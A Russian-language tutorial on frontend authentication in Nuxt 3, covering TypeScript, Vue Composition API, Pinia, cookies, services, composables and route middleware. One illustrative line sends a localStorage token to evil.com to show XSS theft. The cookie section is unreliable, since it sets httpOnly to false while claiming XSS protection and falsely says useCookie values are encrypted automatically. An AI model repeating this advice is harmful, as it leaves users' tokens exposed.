# 📚 День 1: Frontend Аутентификация - Теория

> **Перед практикой**: Изучи эти концепции, чтобы понимать что делаешь!

---

## 🎯 Содержание

1. [TypeScript - Типизация](#1-typescript---типизация)
2. [Vue 3 Composition API](#2-vue-3-composition-api)
3. [Pinia Store - State Management](#3-pinia-store---state-management)
4. [Nuxt 3 Cookies - Безопасное хранение](#4-nuxt-3-cookies---безопасное-хранение)
5. [Service Layer Pattern](#5-service-layer-pattern)
6. [Composables - Переиспользуемая логика](#6-composables---переиспользуемая-логика)
7. [Middleware - Защита маршрутов](#7-middleware---защита-маршрутов)
8. [Компонентная архитектура](#8-компонентная-архитектура)

---

## 1. TypeScript - Типизация

### Что такое TypeScript?

**TypeScript** - это надстройка над JavaScript, добавляющая статическую типизацию.

**Зачем нужен:**
- 🔍 **Автодополнение** - IDE подсказывает методы и свойства
- 🐛 **Ловит ошибки** на этапе разработки, а не в production
- 📖 **Документация** - типы показывают что ожидается
- 🔄 **Рефакторинг** - безопасно менять код

### Interface - Описание структуры

**Interface** - контракт, описывающий форму объекта.

```typescript
// Определение интерфейса
interface User {
  _id: string          // Обязательное поле
  name: string         // Обязательное поле
  email: string        // Обязательное поле
  avatar?: string | null  // Опциональное (? = может отсутствовать)
  status?: string      // Опциональное
}

// Использование
const user: User = {
  _id: '123',
  name: 'John',
  email: 'john@example.com'
  // avatar и status можно не указывать
}
```

**Ключевые моменты:**
- `?` после имени = опциональное поле
- `| null` = может быть null
- `string[]` = массив строк
- `'online' | 'offline'` = только эти значения (union type)

### Type - Альтернатива Interface

**Type** - более гибкий способ определения типов.

```typescript
// Union type - "или-или"
type Status = 'online' | 'offline' | 'away'

// Intersection - объединение типов
type UserWithStatus = User & { status: Status }

// Function type
type LoginFunction = (email: string, password: string) => Promise<void>
```

**Когда использовать:**
- `interface` - для объектов, которые могут расширяться
- `type` - для union types, функций, примитивов

### Generics (Дженерики) - `<>`

**Generics** - параметры типов, позволяющие создавать переиспользуемый код для разных типов.

**Простыми словами:** `<>` - это "параметр типа", как параметр функции, но для типов.

#### Аналогия с функциями

```typescript
// Обычная функция - параметр ЗНАЧЕНИЯ
function print(value: string) {
  console.log(value)
}
print("Hello")  // Передаем значение

// Generic функция - параметр ТИПА
function print<T>(value: T) {
  console.log(value)
}
print<string>("Hello")  // Передаем ТИП через <>
print<number>(123)      // Другой тип
```

#### Зачем нужны Generics?

**Без Generics (дублирование):**
```typescript
function printString(value: string) { console.log(value) }
function printNumber(value: number) { console.log(value) }
function printUser(value: User) { console.log(value) }
```

**С Generics (переиспользование):**
```typescript
function print<T>(value: T) {
  console.log(value)
}
// Одна функция для всех типов!
```

#### Встроенные Generic типы

```typescript
// Array<T>
const numbers: Array<number> = [1, 2, 3]
const strings: Array<string> = ['a', 'b']

// Promise<T>
async function fetchUser(): Promise<User> {
  return await fetch('/api/user').then(r => r.json())
}

// Record<K, V> - объект с ключами K и значениями V
const scores: Record<string, number> = {
  alice: 100,
  bob: 95
}
```

#### Generics в Vue 3

```typescript
// ref<T>
const count = ref<number>(0)
const user = ref<User | null>(null)

// computed<T>
const fullName = computed<string>(() => {
  return `${firstName.value} ${lastName.value}`
})

// defineProps<T>
interface Props {
  modelValue: string
  type?: string
}
const props = defineProps<Props>()
// TypeScript знает: props.modelValue - это string

// defineEmits<T>
const emit = defineEmits<{
  'update:modelValue': [value: string]
  'click': []
}>()
emit('update:modelValue', 'text')  // ✅ OK
emit('update:modelValue', 123)     // ❌ ОШИБКА!
```

#### Создание своих Generic функций

```typescript
// Функция возвращает первый элемент массива
function first<T>(array: T[]): T {
  return array[0]
}

const num = first<number>([1, 2, 3])    // num: number
const str = first<string>(['a', 'b'])  // str: string

// TypeScript может вывести тип автоматически
const num2 = first([1, 2, 3])  // num2: number
```

#### Generic интерфейсы

```typescript
// Интерфейс с параметром типа
interface ApiResponse<T> {
  data: T
  error: string | null
  loading: boolean
}

// Использование
const userResponse: ApiResponse<User> = {
  data: { _id: '123', name: 'John', email: 'john@example.com' },
  error: null,
  loading: false
}

const usersResponse: ApiResponse<User[]> = {
  data: [user1, user2],
  error: null,
  loading: false
}
```

#### Практические примеры

**1. API запросы:**
```typescript
// $fetch<T> - указываем тип ответа
const response = await $fetch<AuthResponse>('/auth/login', {
  method: 'POST',
  body: credentials
})
// response.accessToken - TypeScript знает это поле
```

**2. Store:**
```typescript
// ref<T> - тип значения внутри ref
const user = ref<User | null>(null)
const items = ref<string[]>([])

user.value = { _id: '123', name: 'John', email: 'john@example.com' }  // ✅
user.value = "text"  // ❌ ОШИБКА!
```

**3. Компоненты:**
```typescript
interface Props {
  items: string[]
  selected?: number
}

// <Props> - TypeScript проверяет props
const props = defineProps<Props>()
console.log(props.items)     // ✅ string[]
console.log(props.unknown)   // ❌ ОШИБКА!
```

**Ключевые моменты:**
- `<T>` - параметр типа (T - convention, можно любое имя)
- Generics = переиспользование кода с разными типами
- TypeScript проверяет типы на этапе компиляции
- Автодополнение работает благодаря Generics

---

## 2. Vue 3 Composition API

### Что такое Composition API?

**Composition API** - новый способ организации логики в Vue 3 компонентах.

**Старый способ (Options API)** - НЕ используем:
```vue
<script>
export default {
  data() {
    return { count: 0 }
  },
  methods: {
    increment() { this.count++ }
  }
}
</script>
```

**Новый способ (Composition API)** - используем:
```vue
<script setup lang="ts">
import { ref } from 'vue'

const count = ref(0)
const increment = () => count.value++
</script>
```

### `<script setup>` - Синтаксический сахар

**`<script setup>`** - упрощенный синтаксис Composition API.

**Преимущества:**
- ✅ Меньше boilerplate кода
- ✅ Всё автоматически доступно в template
- ✅ Лучшая производительность
- ✅ Лучшая поддержка TypeScript

```vue
<script setup lang="ts">
// Всё что объявлено здесь - доступно в template
const message = 'Hello'
const count = ref(0)
const increment = () => count.value++
</script>

<template>
  <p>{{ message }}</p>
  <p>{{ count }}</p>
  <button @click="increment">+1</button>
</template>
```

### ref() - Реактивная переменная

**`ref()`** - создает реактивную ссылку на значение.

```vue
<script setup>
import { ref } from 'vue'

// Создание ref
const count = ref(0)

// Чтение/запись в script (через .value)
console.log(count.value) // 0
count.value = 5
count.value++

// Функция изменения
const increment = () => {
  count.value++  // .value обязателен!
}
</script>

<template>
  <!-- В template .value НЕ нужен -->
  <p>Count: {{ count }}</p>
  <button @click="increment">+1</button>
</template>
```

**Важно:**
- В `<script>` используй `.value`
- В `<template>` НЕ используй `.value`
- При изменении → UI обновляется автоматически

### reactive() - Реактивный объект

**`reactive()`** - создает реактивный объект.

```typescript
import { reactive } from 'vue'

// Для объектов
const form = reactive({
  email: '',
  password: ''
})

// Изменение (без .value)
form.email = 'test@example.com'
form.password = '123456'
```

**Когда использовать:**
- `ref()` - для примитивов (string, number, boolean)
- `reactive()` - для объектов с несколькими полями

### computed() - Вычисляемое свойство

**`computed()`** - создает вычисляемое значение с кешированием.

```vue
<script setup>
import { ref, computed } from 'vue'

const firstName = ref('John')
const lastName = ref('Doe')

// Вычисляется автоматически при изменении зависимостей
const fullName = computed(() => {
  return `${firstName.value} ${lastName.value}`
})

// Изменим firstName
firstName.value = 'Jane'
// fullName автоматически = "Jane Doe"
</script>

<template>
  <p>{{ fullName }}</p>
</template>
```

**Зачем computed:**
- ✅ **Кеширование** - пересчитывается только при изменении зависимостей
- ✅ **Производительность** - не вызывается каждый рендер
- ✅ **Чистота кода** - логика в одном месте

**Разница ref vs computed:**
```typescript
// ref - хранит значение (можно менять)
const count = ref(0)
count.value = 5  // ✅ OK

// computed - вычисляет значение (только чтение)
const doubled = computed(() => count.value * 2)
doubled.value = 10  // ❌ ОШИБКА!
```

### watch() - Отслеживание изменений

**`watch()`** - выполняет код при изменении значения.

```typescript
import { ref, watch } from 'vue'

const email = ref('')

// Следим за изменениями email
watch(email, (newValue, oldValue) => {
  console.log(`Email changed from ${oldValue} to ${newValue}`)
})

// Следим за несколькими значениями
watch([email, password], ([newEmail, newPass]) => {
  console.log('Form changed')
})
```

---

## 3. Pinia Store - State Management

### Что такое Pinia?

**Pinia** - библиотека для управления глобальным состоянием в Vue.js.

**Простыми словами:** Общее хранилище данных, доступное всем компонентам.

### Зачем нужна Pinia?

**Проблема без Pinia:**
```vue
<!-- LoginPage.vue -->
<script setup>
const user = { name: 'John' }
// user доступен ТОЛЬКО здесь
</script>

<!-- ProfilePage.vue -->
<script setup>
// Как получить user из LoginPage? 🤔
// Нужно передавать через props по всей цепочке
</script>
```

**Решение с Pinia:**
```typescript
// stores/auth.ts - ОБЩЕЕ хранилище
const user = { name: 'John' }

// LoginPage.vue
const authStore = useAuthStore()
console.log(authStore.user) // { name: 'John' }

// ProfilePage.vue  
const authStore = useAuthStore()
console.log(authStore.user) // ТОТ ЖЕ user!
```

### defineStore() - Создание Store

**`defineStore()`** - функция для создания хранилища.

```typescript
import { defineStore } from 'pinia'

export const useAuthStore = defineStore('auth', () => {
  // 1. STATE - реактивные данные
  const user = ref<User | null>(null)
  const accessToken = ref<string | null>(null)
  const loading = ref(false)
  const error = ref<string | null>(null)
  
  // 2. GETTERS - вычисляемые значения
  const isAuthenticated = computed(() => 
    !!user.value && !!accessToken.value
  )
  
  // 3. ACTIONS - методы
  async function login(credentials: LoginCredentials) {
    loading.value = true
    try {
      const response = await authService.login(credentials)
      user.value = response.user
      accessToken.value = response.accessToken
    } finally {
      loading.value = false
    }
  }
  
  // 4. RETURN - что доступно снаружи
  return {
    user,
    accessToken,
    loading,
    error,
    isAuthenticated,
    login
  }
})
```

**Composition API стиль (используем):**
- Используем `ref()`, `computed()` как обычно
- Возвращаем что нужно экспортировать
- Более гибкий и понятный

### Использование Store

```vue
<script setup lang="ts">
import { useAuthStore } from '~/stores/auth'

// Получить store
const authStore = useAuthStore()

// Читать state
console.log(authStore.user)
console.log(authStore.isAuthenticated)

// Вызывать actions
await authStore.login({ email, password })
authStore.logout()
</script>

<template>
  <div v-if="authStore.isAuthenticated">
    Welcome, {{ authStore.user?.name }}!
  </div>
</template>
```

---

## 4. Nuxt 3 Cookies - Безопасное хранение

### Проблема localStorage

**localStorage** - небезопасен для хранения токенов!

**Уязвимости:**
- ❌ **XSS атаки** - вредоносный JS может украсть токен
- ❌ **Доступен из любого скрипта**
- ❌ **Нет защиты от CSRF**

```javascript
// Любой скрипт может украсть токен
const token = localStorage.getItem('token')
fetch('https://evil.com/steal', { body: token })
```

### Решение: HttpOnly Cookies

**HttpOnly Cookies** - безопасный способ хранения токенов.

**Преимущества:**
- ✅ **Недоступны для JavaScript** (защита от XSS)
- ✅ **Автоматически отправляются** с запросами
- ✅ **Secure флаг** - только HTTPS
- ✅ **SameSite** - защита от CSRF
- ✅ **Шифрование** - Nuxt автоматически шифрует

### useCookie() - Nuxt 3 API

**`useCookie()`** - composable для работы с cookies в Nuxt.

```typescript
// Создание cookie
const tokenCookie = useCookie('auth_token', {
  maxAge: 60 * 60 * 24 * 7,  // 7 дней
  secure: true,               // Только HTTPS (в production)
  sameSite: 'strict',         // CSRF защита
  httpOnly: false             // Nuxt cookies шифруются автоматически
})

// Запись
tokenCookie.value = 'jwt_token_here'

// Чтение
const token = tokenCookie.value

// Удаление
tokenCookie.value = null
```

**Параметры:**
- `maxAge` - время жизни в секундах
- `secure` - только HTTPS (true в production)
- `sameSite` - защита от CSRF ('strict', 'lax', 'none')
- `httpOnly` - недоступен для JS (в Nuxt всегда false, но шифруется)

### Шифрование Cookies

**Nuxt автоматически шифрует cookies** если установлен `NUXT_SESSION_PASSWORD`.

```bash
# .env
NUXT_SESSION_PASSWORD=your-secret-key-min-32-chars
```

**Как работает:**
1. Nuxt берет значение cookie
2. Шифрует его с помощью секретного ключа
3. Сохраняет зашифрованное значение
4. При чтении - автоматически расшифровывает

**Безопасность:**
- Даже если злоумышленник украдет cookie - он зашифрован
- Без секретного ключа невозможно расшифровать
- Ключ хранится только на сервере

---

## 5. Service Layer Pattern

### Что такое Service Layer?

**Service Layer** - слой который изолирует API вызовы от компонентов.

**Архитектура:**
```
Component (UI)
    ↓
Composable (Facade)
    ↓
Store (State)
    ↓
Service (API) ← Изолированный слой
    ↓
Backend API
```

### Зачем нужен?

**Без Service Layer (плохо):**
```vue
<script setup>
// API логика прямо в компоненте
const login = async () => {
  const response = await fetch('http://localhost:3001/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  const data = await response.json()
  // Обработка...
}
</script>
```

**С Service Layer (хорошо):**
```typescript
// services/api/auth.service.ts
export async function login(credentials: LoginCredentials) {
  const response = await $fetch('/auth/login', {
    method: 'POST',
    body: credentials
  })
  return {
    user: response.user,
    accessToken: response.access_token  // Маппинг
  }
}
```

```vue
<script setup>
import * as authService from '~/services/api/auth.service'

const login = async () => {
  const data = await authService.login({ email, password })
  // Чисто и понятно!
}
</script>
```

**Преимущества:**
- ✅ **Изоляция** - API логика в одном месте
- ✅ **Переиспользование** - один сервис для всех
- ✅ **Тестируемость** - легко мокировать
- ✅ **Маппинг** - преобразование данных backend → frontend
- ✅ **Обработка ошибок** - централизованная

### Маппинг данных

**Backend возвращает:**
```json
{
  "access_token": "jwt...",
  "user": { "_id": "123", "name": "John" }
}
```

**Frontend ожидает:**
```typescript
interface AuthResponse {
  accessToken: string  // camelCase вместо snake_case
  user: User
}
```

**Service делает маппинг:**
```typescript
export async function login(credentials: LoginCredentials): Promise<AuthResponse> {
  const response = await $fetch<any>('/auth/login', {
    method: 'POST',
    body: credentials
  })
  
  // Маппинг: access_token → accessToken
  return {
    user: response.user,
    accessToken: response.access_token
  }
}
```

---

## 6. Composables - Переиспользуемая логика

### Что такое Composable?

**Composable** - функция которая инкапсулирует и переиспользует реактивную логику.

**Naming Convention:** Всегда начинается с `use...`
- `useAuth`, `useUser`, `useCart`, `useForm`

### Зачем нужны?

**Проблема без Composable:**
```vue
<!-- LoginPage.vue -->
<script setup>
const authStore = useAuthStore()
const router = useRouter()

const login = async (credentials) => {
  await authStore.login(credentials)
  await router.push('/')
}
</script>

<!-- RegisterPage.vue -->
<script setup>
const authStore = useAuthStore()
const router = useRouter()

const register = async (data) => {
  await authStore.register(data)
  await router.push('/')
}
</script>
```

**Решение с Composable:**
```typescript
// composables/useAuth.ts
export const useAuth = () => {
  const authStore = useAuthStore()
  const router = useRouter()
  
  const login = async (credentials: LoginCredentials) => {
    await authStore.login(credentials)
    await router.push('/')
  }
  
  const register = async (data: RegisterData) => {
    await authStore.register(data)
    await router.push('/')
  }
  
  return {
    user: computed(() => authStore.user),
    isAuthenticated: computed(() => authStore.isAuthenticated),
    loading: computed(() => authStore.loading),
    error: computed(() => authStore.error),
    login,
    register,
    logout: authStore.logout
  }
}
```

**Использование:**
```vue
<script setup>
const { login, user, isAuthenticated } = useAuth()

const handleLogin = async () => {
  await login({ email, password })
  // Автоматический редирект внутри useAuth
}
</script>
```

### Facade Pattern

**Composable = Facade** над Store.

**Facade Pattern** - упрощенный интерфейс к сложной системе.

```
Component
    ↓
useAuth (Facade) ← Простой интерфейс
    ↓
AuthStore + Router + ... ← Сложная логика
```

**Преимущества:**
- ✅ Простой API для компонентов
- ✅ Скрывает сложность
- ✅ Легко менять реализацию
- ✅ Переиспользование логики

---

## 7. Middleware - Защита маршрутов

### Что такое Middleware?

**Middleware** - функция которая выполняется перед переходом на страницу.

**Зачем:** Защита routes от неавторизованных пользователей.

### defineNuxtRouteMiddleware

```typescript
// middleware/auth.ts
export default defineNuxtRouteMiddleware(async (to, from) => {
  const authStore = useAuthStore()
  
  // Проверка авторизации
  if (!authStore.isAuthenticated) {
    // Попытка восстановить сессию из cookie
    const tokenCookie = useCookie('auth_token')
    if (tokenCookie.value) {
      await authStore.restoreSession()
    }
  }
  
  // Если всё ещё не авторизован - редирект
  if (!authStore.isAuthenticated) {
    return navigateTo('/login')
  }
})
```

**Параметры:**
- `to` - куда идем (целевой route)
- `from` - откуда идем (текущий route)

**Возврат:**
- `undefined` - пропустить (продолжить навигацию)
- `navigateTo('/path')` - редирект

### Использование на странице

```vue
<script setup lang="ts">
// Применить middleware к этой странице
definePageMeta({
  middleware: ['auth']  // Требует авторизацию
})

const { user } = useAuth()
</script>

<template>
  <div>
    <h1>Защищенная страница</h1>
    <p>Привет, {{ user?.name }}!</p>
  </div>
</template>
```

### Guest Middleware

**Обратная логика** - для страниц login/register (только для неавторизованных).

```typescript
// middleware/guest.ts
export default defineNuxtRouteMiddleware((to, from) => {
  const authStore = useAuthStore()
  
  // Если авторизован - редирект на главную
  if (authStore.isAuthenticated) {
    return navigateTo('/')
  }
})
```

```vue
<!-- pages/login.vue -->
<script setup>
definePageMeta({
  middleware: ['guest']  // Только для неавторизованных
})
</script>
```

---

## 8. Компонентная архитектура

### Принцип DRY (Don't Repeat Yourself)

**DRY** - не повторяйся. Один компонент для всех похожих элементов.

**Плохо (дублирование):**
```vue
<!-- LoginPage.vue -->
<input type="email" class="input" />

<!-- RegisterPage.vue -->
<input type="email" class="input" />

<!-- ProfilePage.vue -->
<input type="email" class="input" />
```

**Хорошо (переиспользование):**
```vue
<!-- components/ui/BaseInput.vue -->
<template>
  <input :type="type" :value="modelValue" class="input" />
</template>

<!-- Использование везде -->
<BaseInput v-model="email" type="email" />
```

### Props - Входные параметры

**Props** - данные которые компонент получает от родителя.

```vue
<script setup lang="ts">
interface Props {
  modelValue: string    // Значение
  type?: string         // Тип input
  placeholder?: string  // Подсказка
  error?: string        // Ошибка валидации
}

const props = withDefaults(defineProps<Props>(), {
  type: 'text'
})
</script>

<template>
  <input 
    :type="props.type"
    :placeholder="props.placeholder"
  />
</template>
```

**Использование:**
```vue
<BaseInput
  v-model="email"
  type="email"
  placeholder="Введите email"
  :error="emailError"
/>
```

### Emits - События

**Emits** - события которые компонент отправляет родителю.

```vue
<script setup lang="ts">
const emit = defineEmits<{
  'update:modelValue': [value: string]
  'blur': []
  'focus': []
}>()

const handleInput = (event: Event) => {
  const value = (event.target as HTMLInputElement).value
  emit('update:modelValue', value)
}
</script>

<template>
  <input 
    @input="handleInput"
    @blur="emit('blur')"
    @focus="emit('focus')"
  />
</template>
```

### v-model - Двустороннее связывание

**v-model** - синтаксический сахар для props + events.

```vue
<!-- Короткая запись -->
<BaseInput v-model="email" />

<!-- Эквивалентно -->
<BaseInput
  :modelValue="email"
  @update:modelValue="email = $event"
/>
```

**Реализация в компоненте:**
```vue
<script setup lang="ts">
const props = defineProps<{ modelValue: string }>()
const emit = defineEmits<{ 'update:modelValue': [value: string] }>()

const model = computed({
  get: () => props.modelValue,
  set: (value) => emit('update:modelValue', value)
})
</script>

<template>
  <input v-model="model" />
</template>
```

### Slots - Гибкость компонентов

**Slots** - места для вставки контента от родителя.

```vue
<!-- components/auth/Form.vue -->
<template>
  <div class="auth-form">
    <header>
      <slot name="header" />
    </header>
    
    <main>
      <slot />  <!-- Основной контент -->
    </main>
    
    <footer>
      <slot name="footer" />
    </footer>
  </div>
</template>
```

**Использование:**
```vue
<AuthForm>
  <template #header>
    <h1>Вход</h1>
  </template>
  
  <!-- Основной контент (default slot) -->
  <BaseInput v-model="email" />
  <BaseInput v-model="password" />
  
  <template #footer>
    <NuxtLink to="/register">Регистрация</NuxtLink>
  </template>
</AuthForm>
```

---

## 📝 Резюме

### Что изучили:

1. **TypeScript** - типизация для безопасности
   - `interface` для структуры объектов
   - `type` для union types

2. **Vue 3 Composition API** - современный подход
   - `<script setup>` синтаксис
   - `ref()` для переменных
   - `computed()` для вычислений
   - `watch()` для отслеживания

3. **Pinia Store** - глобальное состояние
   - `defineStore()` для создания
   - Composition API стиль

4. **Nuxt 3 Cookies** - безопасное хранение
   - `useCookie()` API
   - Автоматическое шифрование
   - Защита от XSS и CSRF

5. **Service Layer** - изоляция API
   - Маппинг данных
   - Централизованная обработка ошибок

6. **Composables** - переиспользование логики
   - Facade Pattern
   - `use...` naming

7. **Middleware** - защита маршрутов
   - `defineNuxtRouteMiddleware`
   - Auth и Guest middleware

8. **Компонентная архитектура** - DRY принцип
   - Props и Emits
   - v-model
   - Slots

---

## 🚀 Готов к практике!

Теперь переходи к **Practice.md** и начинай писать код! 💪

Все эти концепции применишь на практике в заданиях.
